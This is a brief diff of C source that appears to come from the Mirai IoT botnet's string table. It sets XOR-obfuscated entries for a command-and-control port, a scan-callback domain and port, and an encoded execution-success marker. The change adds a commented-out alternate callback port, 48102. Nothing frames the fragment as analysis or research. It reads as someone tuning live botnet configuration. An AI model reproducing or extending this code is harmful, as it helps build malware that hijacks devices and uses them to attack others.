@@ -19,6 +19,7 @@ void table_init(void)
     add_entry(TABLE_CNC_PORT, "\x22\x35", 2);   // 23
 
     add_entry(TABLE_SCAN_CB_DOMAIN, SCAN_DOMAIN_NAME, SCAN_DOMAIN_NAME_LEN);
+    //add_entry(TABLE_SCAN_CB_PORT, "\x99\xC4", 2);         // 48102
     add_entry(TABLE_SCAN_CB_PORT, "\x99\xC7", 2);         // 48101
 
     add_entry(TABLE_EXEC_SUCCESS, "\x4E\x4B\x51\x56\x47\x4C\x4B\x4C\x45\x02\x56\x57\x4C\x12\x22", 15);
